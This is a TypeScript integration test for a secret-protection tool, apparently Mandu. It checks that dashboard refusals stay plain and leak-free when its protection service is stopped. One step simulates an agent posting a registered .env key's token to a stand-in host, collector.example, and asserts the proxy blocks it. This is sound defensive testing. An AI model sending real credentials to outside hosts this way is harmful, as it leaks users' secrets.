/**
 * product-service-down-refusals.test — a refused request on the product
 * page while its protection service (the arbiter) is stopped, across the
 * REAL components (dashboard.md §4.25 "Refusals", *A stopped service,
 * however the route says it*). Mandu-new.
 *
 * Until 2026-10-10 the page said "The protection service is not running.
 * Start it under Settings, …" only for the 503 `unreachable` body, which
 * only /api/home and /api/home/agent send. Every other route passed the
 * failed dial on: an answer to a question showed
 * "connect ENOENT /…/admin.sock", Settings › Sensitivity labels, Keys Mandu
 * found and Describe "… (connect ENOENT /…/arbiter.sock)". And "Start it
 * under Settings" was plain text, where the hero and the agent page link it.
 *
 *   R1  the net-proxy, wired as production wires it, stops a registered
 *       secret's send (`secrets` axes) and files a question; the served Home,
 *       signed in, shows its card;
 *   R2  the arbiter stops; the dashboard's real routes, over the adapter
 *       server-main.ts builds (makeApprovalsArbiter, the MANDU_ADMIN_SOCK
 *       admin channel), pass the failed dial on; Allow once on the card
 *       drawn before says the page's sentence, with one link to Settings and
 *       no socket, errno or inspector word; the link opens Settings, whose
 *       Sensitivity labels card says the same;
 *   R3  Rules, opened now: Keys Mandu found and Describe what you want say
 *       the same, with the link;
 *   R4  the oracle: no route nor rendered page carries the secret's value,
 *       a token, or the socket path.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { request as httpRequest } from "node:http";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { ArbiterServer } from "../../arbiter/ipc/server.js";
import { ArbiterClient } from "../../arbiter/ipc/client.js";
import { NetProxy } from "../../interceptors/net-proxy/src/proxy.js";
import { ArbiterClientAdapter, type RealArbiterClient } from "../../interceptors/net-proxy/src/arbiter-client.js";
import { DashboardServer } from "../../dashboard/src/server.js";
import { ArbiterEventSource } from "../../dashboard/src/event-source.js";
import { makeApprovalsArbiter } from "../../dashboard/src/arbiter-adapter.js";
import type { HomeVM } from "../../dashboard/src/view-model/home.js";
import { ADMIN_OPTS, ADMIN_COOKIE, CSRF_ADMIN } from "../../dashboard/test/unit/admin-session.js";
import { servedProductPage } from "../../dashboard/test/unit/ui/served-page.js";
import { waitWhile } from "../../dashboard/test/unit/page-wait.js";
import { stateAxes } from "../lib/axes.js";
import { humanSockIn } from "../lib/human-plane.js";
import { pageFetch } from "../../dashboard/test/unit/page-fetch.js";

stateAxes("secrets");

const KEY_VALUE = "sk_live_productDownRefusalsStackCanary01";
const SESSION = "1791900000-731";
const UNREACHABLE_WORDS = "The protection service is not running. Start it under Settings, or try again in a moment.";
/** The one link of that sentence: Settings, where the Start of the service is. */
const START = ["Start it under Settings", "/settings", "settings"];
/** What a failed dial says, which the page must not. */
const DIAL = /ENOENT|ECONNREFUSED|\.sock\b|arbiter/;
const SIGNED_IN = { headers: { Cookie: ADMIN_COOKIE } };

/** One absolute-form request through the forward proxy. */
function viaProxy(port: number, url: string, body: string): Promise<{ status: number; body: string }> {
  const u = new URL(url);
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: url, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
      (res) => {
        const chunks: Buffer[] = [];
        res.on("data", (c) => chunks.push(c));
        res.on("end", () => resolve({ status: res.statusCode ?? 0, body: Buffer.concat(chunks).toString("utf8") }));
        res.on("error", reject);
      },
    );
    req.on("error", reject);
    req.end(body);
  });
}

// eslint-disable-next-line @typescript-eslint/no-explicit-any
const links = (node: any): string[][] => [...node.querySelectorAll("a")].map((a: any) => [a.textContent, a.getAttribute("href"), a.dataset.pageLink]);
// eslint-disable-next-line @typescript-eslint/no-explicit-any
const text = (doc: any, id: string): string => doc.getElementById(id)?.textContent ?? "";

test("with the protection service stopped, every refusal on the product page says so in its words, with Start a link to Settings (real arbiter, net-proxy, adapter, dashboard)", { timeout: 180_000 }, async () => {
  const tmp = mkdtempSync(join(tmpdir(), "mandu-down-refusals-"));
  const home = join(tmp, "home");
  mkdirSync(join(home, "proj"), { recursive: true });
  const socketPath = join(tmp, "arbiter.sock");
  const adminPath = join(tmp, "admin.sock");
  const humanPath = humanSockIn(tmp);
  const arbiter = new ArbiterServer({
    socketPath, adminSocketPath: adminPath, humanSocketPath: humanPath,
    dbPath: join(tmp, "symbols.sqlite"), eventDir: join(tmp, "events"), log: () => {},
    confidentiality: true, integrity: false, // the `secrets` axes, stated
  });
  await arbiter.listen();
  let arbiterUp = true;

  // Production wiring of the net-proxy's arbiter (net-proxy/src/server-main.ts).
  const netClient = new ArbiterClient(socketPath);
  await netClient.connect();
  const netHuman = new ArbiterClient(humanPath);
  const forwarded: string[] = [];
  const proxy = new NetProxy({
    arbiter: new ArbiterClientAdapter(netClient as unknown as RealArbiterClient, netHuman),
    sessionId: SESSION,
    forwarder: async ({ url }) => {
      forwarded.push(url);
      throw new Error("a stopped send must never be forwarded");
    },
    log: () => {},
  });
  const proxyPort = await proxy.listen(0);

  const gate = new ArbiterClient(socketPath); await gate.connect();
  const admin = new ArbiterClient(adminPath); await admin.connect();
  // The dashboard's own adapter, as server-main.ts builds it; the admin
  // channel is the MANDU_ADMIN_SOCK path form of its adminTarget.
  const surfaces = await makeApprovalsArbiter(socketPath, () => ({ socketPath: adminPath }));
  assert.ok(surfaces, "the adapter connects to the running arbiter");
  let modelSelections = 0;
  let modelCalls = 0;
  const dashboard = new DashboardServer({
    source: new ArbiterEventSource({ socketPath, humanSocketPath: humanPath }),
    approvalsArbiter: surfaces.arbiter,
    secretsArbiter: surfaces.secrets,
    postureArbiter: surfaces.posture,
    auditArbiter: surfaces.audit,
    policyDocArbiter: surfaces.policyDoc,
    // Describe resolves a model before reading the rules. Supply that
    // prerequisite without depending on a developer's logged-in agent.
    assistantModel: async () => {
      modelSelections++;
      return { async complete() {
        modelCalls++;
        throw new Error("a stopped arbiter must prevent the model call");
      } };
    },
    fileBrowserHome: home,
    configEnv: { MANDU_HOME: join(tmp, "mandu-home") },
    log: () => {},
    ...ADMIN_OPTS,
  });
  const base = `http://127.0.0.1:${await dashboard.listen(0)}`;
  const rendered: string[] = [];
  const answers: string[] = [];
  try {
    // ── R1: a stopped send files a question; the served Home shows it ────────
    const env = join(home, "proj", ".env");
    writeFileSync(env, `STRIPE_KEY=${KEY_VALUE}\n`);
    const reg = await gate.registerSecret({ path: env, sessionKey: SESSION });
    const keySym = /\$MDU:nomodel_Read\[[0-9a-f]+\]\.STRIPE_KEY/.exec(reg.twin ?? "")?.[0];
    assert.ok(keySym, `the key has its own symbol: ${JSON.stringify(reg)}`);
    const res = await viaProxy(proxyPort, "http://collector.example/upload", `k=${keySym}`);
    assert.equal(res.status, 403, `the send is stopped: ${res.body}`);
    assert.ok(!res.body.includes(KEY_VALUE), "the agent's answer carries no value");
    assert.deepEqual(forwarded, []);
    const row = (await admin.egressApprovals("pending")).find((a) => a.symbol === keySym);
    assert.ok(row, "the stop queued a question");
    for (let i = 0; i < 100; i++) {
      // Emission is best-effort and asynchronous: wait until Home lists it.
      const vm = (await (await pageFetch(`${base}/api/home`, { headers: { Cookie: ADMIN_COOKIE } })).json()) as HomeVM;
      if (vm.waiting.some((w) => w.id === row!.id)) break;
      await new Promise((r) => setTimeout(r, 20));
    }

    const card = `#home-waiting .ask[data-id="${row!.id}"]`;
    await servedProductPage(base, "/", (doc) => doc.querySelector(card) !== null, async (doc) => {
      const w = doc.defaultView;
      assert.ok(doc.querySelector(card), "Home shows the question");

      // ── R2: the arbiter stops; the card drawn before is answered ───────────
      await arbiter.close();
      arbiterUp = false;
      // The real route passes the failed dial on (what the page used to show).
      const raw = await pageFetch(`${base}/api/egress/approvals/${encodeURIComponent(row!.id)}/approve-once`, { method: "POST", headers: CSRF_ADMIN });
      const rawBody = (await raw.json()) as { error?: string };
      answers.push(JSON.stringify(rawBody));
      assert.match(rawBody.error ?? "", /connect (ENOENT|ECONNREFUSED) \//, `the route says the dial failed: ${raw.status} ${JSON.stringify(rawBody)}`);

      const allow = [...doc.querySelectorAll(`${card} .ask-actions button`)].find((b: any) => b.textContent === "Allow once") as any;
      assert.ok(allow, "the card still has Allow once (no poll ran)");
      allow.click();
      await waitWhile(() => !doc.querySelector(`${card} .ask-error`));
      const line = doc.querySelector(`${card} .ask-error`);
      assert.equal(line.textContent, UNREACHABLE_WORDS, "the page's own sentence on the card");
      assert.doesNotMatch(line.textContent, DIAL, "no socket, no errno, no inspector word");
      assert.deepEqual(links(line), [START], "Start is a link to Settings");
      rendered.push(doc.body.textContent ?? "");

      // The link opens Settings, where the Start of the service is.
      line.querySelector("a").dispatchEvent(new w.MouseEvent("click", { bubbles: true, cancelable: true }));
      await waitWhile(() => doc.getElementById("page-settings").hidden || !/not running/.test(text(doc, "settings-labels")));
      assert.equal(doc.getElementById("page-settings").hidden, false, "Settings is open");
      assert.equal(w.location.pathname, "/settings");
      assert.equal(text(doc, "settings-labels"), UNREACHABLE_WORDS, "the labels card says the same, from the real route's 502");
      assert.deepEqual(links(doc.getElementById("settings-labels")), [START]);
      assert.doesNotMatch(text(doc, "page-settings"), DIAL);
      rendered.push(doc.body.textContent ?? "");
    }, SIGNED_IN);

    // ── R3: Rules, opened now: Keys Mandu found and Describe ─────────────────
    await servedProductPage(base, "/rules", (doc) => doc.getElementById("page-rules")?.hidden === false, async (doc) => {
      const w = doc.defaultView;
      doc.getElementById("suggest-open").click();
      await waitWhile(() => text(doc, "suggest-error") === "");
      assert.equal(text(doc, "suggest-error"), UNREACHABLE_WORDS, "Keys Mandu found");
      assert.deepEqual(links(doc.getElementById("suggest-error")), [START]);

      doc.getElementById("describe-text").value = "Keep .env secret.";
      doc.getElementById("describe-form").dispatchEvent(new w.Event("submit", { cancelable: true }));
      await waitWhile(() => text(doc, "describe-result") === "");
      assert.equal(text(doc, "describe-result"), UNREACHABLE_WORDS, "Describe what you want");
      assert.equal(modelSelections, 1, "Describe passed the configured-model prerequisite");
      assert.equal(modelCalls, 0, "the failed rules read stops before any model call");
      assert.deepEqual(links(doc.getElementById("describe-result")), [START]);
      assert.doesNotMatch(text(doc, "page-rules"), DIAL);
      rendered.push(doc.body.textContent ?? "");
    }, SIGNED_IN);

    // ── R4: no value, no token, no socket path anywhere shown ────────────────
    for (const page of rendered) {
      assert.ok(!page.includes(KEY_VALUE), "no rendered page carries the secret value");
      assert.doesNotMatch(page, /\$MDU/, "nor a token");
      assert.ok(!page.includes(tmp), "nor the path of a socket");
    }
    for (const body of answers) assert.ok(!body.includes(KEY_VALUE), "no route answer carries the secret value");
  } finally {
    await dashboard.close();
    await proxy.close();
    surfaces?.close();
    netClient.close(); netHuman.close();
    gate.close(); admin.close();
    if (arbiterUp) await arbiter.close();
    rmSync(tmp, { recursive: true, force: true });
  }
});
